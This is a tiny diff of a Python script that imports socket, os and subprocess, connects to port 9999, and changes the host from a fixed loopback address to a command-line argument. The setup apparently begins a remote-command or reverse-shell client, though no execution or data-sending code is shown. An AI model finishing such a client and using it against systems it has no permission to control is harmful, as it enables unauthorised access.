@@ -1,9 +1,10 @@
 import socket
 import os
 import subprocess
+import sys
 
 s = socket.socket()
-host = "127.0.0.2"
+host = sys.argv[1]
 port = 9999
 
 system = ["windows","linux"][os.name!="nt"]
